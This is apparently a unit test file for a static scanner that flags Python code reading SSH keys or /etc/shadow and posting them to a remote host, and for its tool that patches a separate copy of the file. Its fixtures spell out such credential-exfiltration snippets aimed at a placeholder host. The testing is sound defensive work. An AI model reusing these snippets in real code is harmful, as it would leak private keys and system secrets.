"""Inert source fixtures: evidence fidelity and separate-copy patch safety."""
import ast
import contextlib
import hashlib
import io
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

import falcon_check as scanner
import falcon_gui as gui
import falcon_remediate as fixes


PREFIX = 'import requests\np = "/home/demo/.ssh/id_example"\nwith open(p) as handle:\n    secret = handle.read()\n'
CALL = 'requests.post("https://example.invalid/upload", data=secret)\n'
SOURCE = PREFIX + CALL


def inspect(source):
    return scanner.analyze_bytes(source.encode(), 'fixture.py', 'python')


class EvidenceTests(unittest.TestCase):
    def uploads(self, source):
        report = inspect(source)
        self.assertIn(report['status'], ('NEEDS REVIEW', 'NO INDICATORS FOUND'))
        return fixes.upload_findings(report)

    def test_trace_connects_path_read_and_destination(self):
        item, = self.uploads(SOURCE)
        self.assertEqual(item['line'], 5)
        self.assertEqual(item['resolved'], '/home/demo/.ssh/id_example')
        self.assertEqual(item['destination'], 'https://example.invalid/upload')
        for line in (2, 3, 4, 5):
            self.assertTrue(any('Line {}:'.format(line) in step for step in item['trace']))
        self.assertIn('not observed transmission', item['uncertainty'])
        self.assertIsNotNone(item['patch_span'])

    def test_supported_aliases_and_payload_shapes(self):
        examples = [
            ('from requests import post as send', 'send("https://example.invalid", secret)'),
            ('import requests as r', 'r.put(url="https://example.invalid", data=secret)'),
            ('import requests', 'requests.patch("https://example.invalid", json={"value": secret})'),
            ('import requests', 'requests.post("https://example.invalid", files={"file": ("sample", handle)})'),
            ('import requests', 'requests.post("https://example.invalid", params={"q": secret})'),
            ('import requests\nsend = requests.post', 'send("https://example.invalid", None, {"q": secret})'),
        ]
        for imports, sink in examples:
            with self.subTest(sink=sink):
                self.assertEqual(len(self.uploads(imports + '\n' + PREFIX.split('\n', 1)[1] + sink)), 1)

    def test_pathlib_and_inline_file_handles(self):
        for data in ('Path("/etc/shadow").read_bytes()', 'Path("/etc/shadow").read_text()', 'open("/etc/shadow", "rb")'):
            with self.subTest(data=data):
                source = 'import requests\nfrom pathlib import Path\nrequests.post("https://example.invalid", data=' + data + ')'
                self.assertEqual(len(self.uploads(source)), 1)

    def test_unknown_destination_is_explicit(self):
        item, = self.uploads(PREFIX + 'requests.post(destination, data=secret)')
        self.assertIn('could not be resolved', item['destination'])

    def test_unrelated_read_and_upload_not_connected(self):
        self.assertEqual(self.uploads(PREFIX + 'requests.post("https://example.invalid", data="hello")'), [])

    def test_literal_path_string_is_not_file_contents(self):
        self.assertEqual(self.uploads('import requests\nrequests.post("https://example.invalid", data="/etc/shadow")'), [])

    def test_reassigned_payload_is_not_stale(self):
        for assignment in ('secret = "hello"', 'secret = unknown()', 'del secret'):
            with self.subTest(assignment=assignment):
                self.assertEqual(self.uploads(PREFIX + assignment + '\n' + CALL), [])

    def test_ordinary_path_and_write_only_handle_not_claimed(self):
        for source in (SOURCE.replace('/home/demo/.ssh/id_example', 'notes.txt'), SOURCE.replace('open(p)', 'open(p, "w")')):
            self.assertEqual(self.uploads(source), [])

    def test_shadowed_requests_not_treated_as_import(self):
        self.assertEqual(self.uploads(PREFIX + 'requests = other\n' + CALL), [])
        self.assertEqual(self.uploads('def example(requests):\n    secret = open("/etc/shadow").read()\n    ' + CALL), [])

    def test_conflicting_branches_drop_payload(self):
        self.assertEqual(self.uploads(PREFIX + 'if choice:\n secret = "hello"\n' + CALL), [])

    def test_container_mutation_and_alias_forget_old_contents(self):
        for mutation in ('alias.clear()', 'alias["file"] = "hello"', 'unknown(alias)'):
            with self.subTest(mutation=mutation):
                source = PREFIX + 'payload = {"file": secret}\nalias = payload\n' + mutation + '\nrequests.post("https://example.invalid", data=payload)'
                self.assertEqual(self.uploads(source), [])

    def test_nested_and_assigned_calls_have_evidence_without_patch(self):
        for sink in ('result = ' + CALL, 'print(' + CALL.strip() + ')', 'if condition: ' + CALL, CALL.strip() + '; print("after")'):
            with self.subTest(sink=sink):
                item, = self.uploads(PREFIX + sink)
                self.assertIsNone(item['patch_span'])

    def test_uninvoked_function_is_analyzed_without_claiming_execution(self):
        source = 'def example():\n' + ''.join('    ' + line + '\n' for line in SOURCE.splitlines())
        item, = self.uploads(source)
        self.assertIsNotNone(item['patch_span'])
        self.assertIn('runtime success', item['uncertainty'])

    def test_imports_and_file_reads_are_never_executed(self):
        with tempfile.TemporaryDirectory() as directory:
            marker = Path(directory) / 'must-not-exist'
            source = 'open({!r}, "w").write("executed")\n'.format(str(marker)) + SOURCE
            self.assertEqual(len(self.uploads(source)), 1)
            self.assertFalse(marker.exists())

    def test_finding_budget_reports_incomplete(self):
        report = inspect(PREFIX + CALL * 21)
        self.assertEqual(report['status'], 'NOT INSPECTED')
        self.assertTrue(any('20' in note for note in report.get('notes', [])))


class PatchTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.source = self.root / 'original.py'
        self.source.write_text(SOURCE)
        self.target = self.root / 'reviewed.py'

    def test_preview_does_not_write_and_rechecks_remaining_findings(self):
        plan = fixes.prepare(self.source)
        self.assertEqual(self.source.read_bytes(), SOURCE.encode())
        self.assertEqual(list(self.root.iterdir()), [self.source])
        self.assertIn('-requests.post(', plan.diff)
        self.assertIn('+pass', plan.diff)
        self.assertEqual(fixes.upload_findings(plan.after), [])
        self.assertEqual(plan.after['status'], 'NEEDS REVIEW')  # File read remains.
        self.assertIn('not runtime testing or antivirus', fixes.preview_text(plan))

    def test_saved_copy_matches_preview_original_unchanged(self):
        plan = fixes.prepare(self.source)
        report = fixes.save_copy(plan, self.target)
        self.assertEqual(self.target.read_bytes(), plan.updated)
        self.assertEqual(self.source.read_bytes(), SOURCE.encode())
        self.assertEqual(report['sha256'], hashlib.sha256(plan.updated).hexdigest())
        self.assertEqual(fixes.upload_findings(report), [])
        self.assertEqual(self.target.stat().st_mode & 0o777, 0o600)

    def test_existing_target_never_overwritten(self):
        self.target.write_text('keep me')
        with self.assertRaises(FileExistsError):
            fixes.save_copy(fixes.prepare(self.source), self.target)
        self.assertEqual(self.target.read_text(), 'keep me')
        self.assertEqual(list(self.root.glob('.falcon-copy-*')), [])

    def test_same_target_never_overwritten(self):
        with self.assertRaises(ValueError):
            fixes.save_copy(fixes.prepare(self.source), self.source)
        self.assertEqual(self.source.read_text(), SOURCE)

    def test_symlink_target_never_followed(self):
        self.target.symlink_to(self.source)
        with self.assertRaises(FileExistsError):
            fixes.save_copy(fixes.prepare(self.source), self.target)
        self.assertEqual(self.source.read_text(), SOURCE)

    def test_source_symlink_refused(self):
        self.target.symlink_to(self.source)
        with self.assertRaises(OSError):
            fixes.prepare(self.target)

    def test_source_changed_since_scan_refused(self):
        with self.assertRaisesRegex(ValueError, 'changed since the scan'):
            fixes.prepare(self.source, expected_sha256='0' * 64)

    def test_source_changed_after_preview_refused(self):
        plan = fixes.prepare(self.source)
        self.source.write_text(SOURCE + '# changed\n')
        with self.assertRaisesRegex(ValueError, 'changed after preview'):
            fixes.save_copy(plan, self.target)
        self.assertFalse(self.target.exists())

    def test_multiline_call_preserves_unrelated_bytes_and_comment(self):
        source = PREFIX + 'requests.post(\n    "https://example.invalid",\n    data=secret,\n)  # retained comment\nprint("after")\n'
        self.source.write_text(source)
        plan = fixes.prepare(self.source)
        expected = PREFIX.encode() + fixes.REPLACEMENT + b'  # retained comment\nprint("after")\n'
        self.assertEqual(plan.updated, expected)
        ast.parse(plan.updated)

    def test_utf8_bom_unicode_and_newlines_preserved(self):
        for newline in ('\n', '\r\n', '\r'):
            for bom in (b'', b'\xef\xbb\xbf'):
                with self.subTest(newline=newline, bom=bom):
                    prefix = '# café — unicode\n' + PREFIX
                    source = (prefix + CALL.replace('/upload', '/café')).replace('\n', newline)
                    self.source.write_bytes(bom + source.encode())
                    plan = fixes.prepare(self.source)
                    self.assertEqual(plan.updated, bom + prefix.replace('\n', newline).encode() + fixes.REPLACEMENT + newline.encode())

    def test_formfeed_and_unicode_separator_do_not_shift_offsets(self):
        prefix = '# comment with \f and \u2028\n' + PREFIX
        self.source.write_text(prefix + CALL)
        self.assertEqual(fixes.prepare(self.source).updated, prefix.encode() + fixes.REPLACEMENT + b'\n')

    def test_indented_call_can_be_only_function_statement_after_read(self):
        source = 'import requests\ndef example():\n    requests.post("https://example.invalid", data=open("/etc/shadow").read())\n'
        self.source.write_text(source)
        updated = fixes.prepare(self.source).updated
        self.assertIn(b'    pass', updated)
        ast.parse(updated)

    def test_multiple_findings_select_only_requested_call(self):
        self.source.write_text(SOURCE + CALL)
        items = fixes.upload_findings(inspect(SOURCE + CALL))
        plan = fixes.prepare(self.source, finding_id=items[1]['id'])
        self.assertEqual(plan.finding['line'], 6)
        self.assertEqual(len(fixes.upload_findings(plan.after)), 1)
        self.assertTrue(plan.updated.startswith(SOURCE.encode()))

    def test_unpatchable_or_malformed_source_refused(self):
        for source in (PREFIX + 'result = ' + CALL, 'bad (', 'print("hello")'):
            with self.subTest(source=source):
                self.source.write_text(source)
                with self.assertRaises(ValueError):
                    fixes.prepare(self.source)

    def test_publication_failure_cleans_temporary_file(self):
        plan = fixes.prepare(self.source)
        with patch.object(fixes.os, 'link', side_effect=OSError('publication failed')):
            with self.assertRaises(OSError):
                fixes.save_copy(plan, self.target)
        self.assertFalse(self.target.exists())
        self.assertEqual(list(self.root.glob('.falcon-copy-*')), [])

    def test_cli_preview_only_and_declined_save_write_nothing(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(fixes.cli(self.source), 0)
            with patch('builtins.input', return_value='no'):
                self.assertEqual(fixes.cli(self.source, self.target), 0)
        self.assertFalse(self.target.exists())

    def test_cli_explicit_approval_saves_copy(self):
        with contextlib.redirect_stdout(io.StringIO()), patch('builtins.input', return_value='SAVE'):
            self.assertEqual(fixes.cli(self.source, self.target), 0)
        self.assertTrue(self.target.exists())
        self.assertEqual(self.source.read_text(), SOURCE)

    def test_cli_eof_does_not_save(self):
        with contextlib.redirect_stdout(io.StringIO()), patch('builtins.input', side_effect=EOFError):
            self.assertEqual(fixes.cli(self.source, self.target), 2)
        self.assertFalse(self.target.exists())

    def test_gui_fix_requires_real_file_and_eligible_finding(self):
        window = gui.FalconWindow.__new__(gui.FalconWindow)
        window.result = inspect(SOURCE)
        self.assertFalse(window.can_fix())
        window.result = scanner.scan_file(self.source, 'python')
        self.assertTrue(window.can_fix())
        self.source.write_text(PREFIX + 'result = ' + CALL)
        window.result = scanner.scan_file(self.source, 'python')
        self.assertFalse(window.can_fix())


if __name__ == '__main__':
    unittest.main()
